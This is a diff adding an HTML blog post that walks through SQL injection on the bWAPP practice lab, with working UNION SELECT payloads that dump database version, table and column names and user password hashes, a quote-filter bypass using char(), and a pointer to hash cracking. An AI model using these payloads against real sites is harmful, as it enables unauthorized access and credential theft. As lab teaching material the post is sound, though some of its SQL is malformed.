@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>Simeon Kakpovi - Programmer and Cyber-Guy</title>
+	<meta charset="UTF-8">
+	<meta name="description" content="Simeon Kakpovi's website and blog">
+	<meta name="keywords" content="Simeon, Kakpovi, Bison, Howard, Benin, Cybersecurity">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<!-- Favicon -->
+	<link href="img/favicon.ico" rel="shortcut icon"/>
+
+	<!-- Stylesheets -->
+	<link rel="stylesheet" href="../../static/css/bootstrap.min.css"/>
+	<link rel="stylesheet" href="../../static/css/font-awesome.min.css"/>
+	<link rel="stylesheet" href="../../static/css/magnific-popup.css"/>
+	<link rel="stylesheet" href="../../static/css/owl.carousel.css"/>
+	<link rel="stylesheet" href="../../static/css/animate.min.css"/>
+	<link rel="stylesheet" href="../../static/css/style.css"/>
+
+	<!--[if lt IE 9]>
+	  <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+	  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+	<![endif]-->
+
+</head>
+<body>
+	<!-- ==== Preloader Start ==== -->
+	<div id="preloader">
+		<div class="pre-container">
+			<div class="spinner">
+				<div class="bounce1"></div>
+				<div class="bounce2"></div>
+				<div class="bounce3"></div>
+			</div>
+		</div>
+	</div>
+	<!-- ==== Preloader End ==== -->
+
+	<!-- ==== Left Bar Start ==== -->
+	<div class="left-bar">
+		<div class="logo">
+			<h2><a href="/">K</a></h2>
+		</div>
+		<div class="social">
+			<div>
+				<a href="https://www.linkedin.com/in/kakpovi/" target="_blank"><i class="fa fa-linkedin"></i></a>
+				<a href="https://github.com/kkneomis/" target="_blank"><i class="fa fa-github"></i></a>
+				<a href="https://twitter.com/realSimDawg" target="_blank"><i class="fa fa-twitter"></i></a>
+			</div>
+		</div>
+		<div class="nav-switch">
+			<span class="bar-one"></span>
+			<span class="bar-two"></span>
+			<span class="bar-three"></span>
+		</div>
+	</div>
+	<!-- ==== Left Bar End ==== -->
+
+
+	<!-- ==== Nav Menu Start ==== -->
+	<nav class="mainmenu">
+		<ul class="menu-list">
+			<li><a href="/#home">Home</a></li>
+			<li><a href="/#about">About</a></li>
+			<li><a href="/#resume">Resume</a></li>
+			<li><a href="/#portfolio">My Work</a></li>
+			<li><a href="/posts">Blog</a></li>
+			<li><a href="/#contact">Contact</a></li>
+		</ul>
+	</nav>
+	<!-- ==== Nav Menu End ==== -->
+
+
+     
+      
+    
+     
+
+    	<!-- ==== Blog Section Start ==== -->
+	<section class="blog-section spad-lg" id="blog">
+		<div class="container blog">
+			<h2>Intro to SQL Injections</h2>
+            <p>2017-05-03</p>
+
+            <p>Structured Query Language (SQL) is used by many developers to insert and retrieve information from a common relational database. Whenever you see a website that does more than just display static information (i.e. letting users make posts or create accounts) it is most likely using a database. Most Wordpress sites run on SQL databases. The standard SQL command looks like this:
+<code>sql
+select * users where name='Simeon'</code>
+This sql statement would simply pull my account information within a web application. In a web application, the developer might dynamically generate a sql statement based on the user input.</p>
+<p>Suppose the developer wanted to select users based on your input, the sql statement might look like this:</p>
+<div class="codehilite"><pre><span></span>select * users where name=&#39;+[NAME]+&#39;
+</pre></div>
+
+
+<p>The problem with this is that you might try to enter a value to break that sql statement or use it to extract more information from the database than you are entitled to (usernames, passwords, ssn numbers, etc...).</p>
+<h3>Let's start with the bwapp SQL Injection (Search/GET) exercise.</h3>
+<p>You should begin by playing around with the search box and entering various values to see what happens. If you simply press enter, all the movies are returned. However, if you enter a single quote ', you get the following error</p>
+<div class="codehilite"><pre><span></span><span class="n">Error</span><span class="o">:</span> <span class="n">You</span> <span class="n">have</span> <span class="n">an</span> <span class="n">error</span> <span class="k">in</span> <span class="n">your</span> <span class="n">SQL</span> <span class="n">syntax</span><span class="o">;</span> <span class="n">check</span> <span class="n">the</span> <span class="n">manual</span> <span class="n">that</span> <span class="n">corresponds</span> <span class="n">to</span> <span class="n">your</span>
+<span class="n">MySQL</span> <span class="n">server</span> <span class="n">version</span> <span class="k">for</span> <span class="n">the</span> <span class="n">right</span> <span class="n">syntax</span> <span class="n">to</span> <span class="n">use</span> <span class="n">near</span> <span class="s1">&#39;%&#39;</span><span class="err">&#39;</span> <span class="n">at</span> <span class="n">line</span> <span class="mi">1</span>
+</pre></div>
+
+
+<p>This is because you have broken the dynamic sql statement was supposed to be generated from your input. We can assume the SQL statement looked something like this:</p>
+<div class="codehilite"><pre><span></span><span class="n">select</span> <span class="o">*</span> <span class="n">from</span> <span class="n">movie</span> <span class="n">where</span> <span class="n">title</span><span class="o">=</span><span class="err">&#39;</span> <span class="o">+</span> <span class="p">[</span><span class="n">YOUR</span> <span class="n">INPUT</span><span class="p">]</span> <span class="o">+</span> <span class="err">&#39;</span>
+</pre></div>
+
+
+<p>I can tell by looking at the url ;). By inputing a single quote, or anything followed by a single quote, you break the sql statement because it now has too many quotes. Suppose you entered "iron man'", then the resulting sql statement would be:</p>
+<div class="codehilite"><pre><span></span>select * from movie where title=&#39;iron man&#39;&#39;
+</pre></div>
+
+
+<p>That's one quote too many! And sql being picky with syntax has no idea how to interpret that. If you ever get this result on any website, you are clear to wreak havoc (at your own risk, of course).</p>
+<p>For this next section, we'll switch from using the input field to messing with the url of the page. This will work because the input is being submitted though a GET request. Go ahead and give it a try! Instead of searching using the input box, just replace everything after the "?title=" in the url with your search term. You should get the same results as using the search box.</p>
+<h3>First, we'll try to guess how many tables are in the database!</h3>
+<p>We can achieve this using sql's ORDER BY command. You can use it like so:</p>
+<div class="codehilite"><pre><span></span>http://192.168.1.250/bWAPP/sqli_1.php?title=1&#39; ORDER BY 99-- -
+</pre></div>
+
+
+<p>First we should recognize that the sql command outputed from like probably looks like:</p>
+<div class="codehilite"><pre><span></span>select * from movie where title=&#39;1&#39; ORDER BY 99-- -
+</pre></div>
+
+
+<p>The "-- " is the SQL syntax for commenting. We want to negate anything that comes after our input so we can be sure about the command's behavior.</p>
+<p>You should get an error from the command above. Since we will always get an error if we order by more than the number of tables that exist, we can keep trying it with a small number until we no longer get an error. At that point we will know how many tables exist in the database.</p>
+<p>If you order order by any number less than 7, you should no longer have an error. Instead, it should say "No movies were found!". Great! Now we can use "union select" command to extract information from other tables. The union select injection only works if we know exactly how many tables exist. It works as follows:</p>
+<div class="codehilite"><pre><span></span>http://192.168.1.250/bWAPP/sqli_1.php?title=1&#39; union select 1,2,3,4,5,6,7-- -
+</pre></div>
+
+
+<p>In this injection, each of the numbers represents a table in the database. If this works, we can replace some of the values to get information about the actual tables. We can use the following to get the of the database:</p>
+<div class="codehilite"><pre><span></span>http://192.168.1.250/bWAPP/sqli_1.php?title=1&#39; union select 1,@@version,3,4,5,6,7-- -
+</pre></div>
+
+
+<p>If you google the resulting version, you can learn more about the database's mechanism and vulnerabilities making your hack job a whole lot easier.</p>
+<p>You can also grab the table names in this manner:</p>
+<div class="codehilite"><pre><span></span>http://192.168.1.250/bWAPP/sqli_1.php?title=1&#39; union select 1,table_name,3,4,5,6,7 from
+information_schema.tables-- -
+</pre></div>
+
+
+<p>Note that most of these tables are autogenerated. The user generated tables appear to be "users", "blog", "heroes", "movies", "login". We can probably get some valuable information from these tables. You can similarly grab the column names. Although they aren't labeled by table, you can probably guess which table they belong to.</p>
+<div class="codehilite"><pre><span></span>http://192.168.1.250/bWAPP/sqli_1.php?title=1&#39; union select 1,column_name,3,4,5,6,7 from
+information_schema.columns-- -
+</pre></div>
+
+
+<p>Now if we actually wanted to know, we could simply use a "where" condition to filter these columns.</p>
+<div class="codehilite"><pre><span></span>http://192.168.1.250/bWAPP/sqli_1.php?title=1&#39; union select 1,column_name,3,4,5,6,7 from
+information_schema.columns where table_name=&quot;users&quot;-- -
+</pre></div>
+
+
+<p>Now for the exciting part: we can go ahead steal the usernames and passwords</p>
+<div class="codehilite"><pre><span></span>http://192.168.1.250/bWAPP/sqli_1.php?title=1&#39; union select 1,login,3,4,5,6,7
+from users-- -
+
+http://192.168.1.250/bWAPP/sqli_1.php?title=1&#39; union select 1,login,3,4,5,6,7
+from users-- -
+</pre></div>
+
+
+<p>Once you get the hash of the password, you can simple google it to find to clear text value if it is a simple password. If if is more complicated and a simple search doesn't find it, you can use a hash cracker like <a href="http://www.openwall.com/john/">John the Ripper</a></p>
+<h3>Bonus!</h3>
+<p>Suppose we have a sensible developer who eliminates the use of quotes and special characters in the input (because she knows about people like us). We can cheat by using the "char" function to convert our word character by character from numberical values to their ascii representation. You can either use and ascii table or an <a href="http://www.unit-conversion.info/texttools/ascii/">ascii to text converter</a> to get the value of each character, and have the browser interpret the result using the "char" function. The two commands below should yield the same results.</p>
+<div class="codehilite"><pre><span></span>http://192.168.1.250/bWAPP/sqli_1.php?title=1&#39; union select 1,column_name,3,4,5,6,7 from
+information_schema.columns where table_name=char(117,115,101,114,115)-- -
+
+http://192.168.1.250/bWAPP/sqli_1.php?title=1&#39; union select 1,column_name,3,4,5,6,7 from
+information_schema.columns where table_name=&quot;users&quot;-- -
+</pre></div>
+
+
+            <nav aria-label="...">
+              <ul class="pager">
+                  
+
+                <li class="previous"><a href="../../posts/cross_site_scripting"><span aria-hidden="true">&larr;</span> Previous </a></li>
+                  
+                  
+              </ul>
+            </nav>
+
+
+		</div>
+	</section><!-- ==== Blog Section End ==== -->
+
+
+
+	<!-- ==== Footer Section Start ==== -->
+	<footer class="footer-section spad">
+		<p> &copy; 2017 Simeon Kakpovi All right reserved </p>
+	</footer>
+	<!-- ==== Footer Section End ==== -->
+
+
+	<!-- ==== Jquery & Scripts==== -->
+    <script src="../../static/js/jquery-2.1.4.min.js"></script>
+    <script src="../../static/js/bootstrap.min.js"></script>
+    <script src="../../static/js/imagesloaded.pkgd.min.js"></script>
+    <script src="../../static/js/isotope.pkgd.min.js"></script>
+    <script src="../../static/js/owl.carousel.min.js"></script>
+    <script src="../../static/js/jquery.nav.min.js"></script>
+    <script src="../../static/js/wow.min.js"></script>
+    <script src="../../static/js/particles.min.js"></script>
+    <script src="../../static/js/init-particles.js"></script>
+    <script src="../../static/js/magnific-popup.min.js"></script>
+    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyB0YyDTa0qqOjIerob2VTIwo_XVMhrruxo"></script>
+    <script src="../../static/js/scripts.js"></script>
+</body>
+</html>
